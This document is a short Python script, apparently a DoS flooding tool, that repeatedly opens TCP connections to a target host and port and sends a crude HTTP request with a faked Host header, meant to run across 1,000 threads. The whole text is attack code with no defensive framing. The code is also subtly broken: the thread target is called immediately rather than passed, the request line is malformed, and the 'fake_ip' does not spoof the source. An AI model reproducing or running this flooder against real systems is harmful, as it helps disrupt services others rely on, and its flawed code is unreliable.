import threading
import socket

# target ip
target = ''
# target port (22 - SSH, 80 - HTTP, etc...)
port = 22
fake_ip = '192.138.50.32'


def start_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(1000):
    thread = threading.Thread(target=start_attack())
    thread.start()
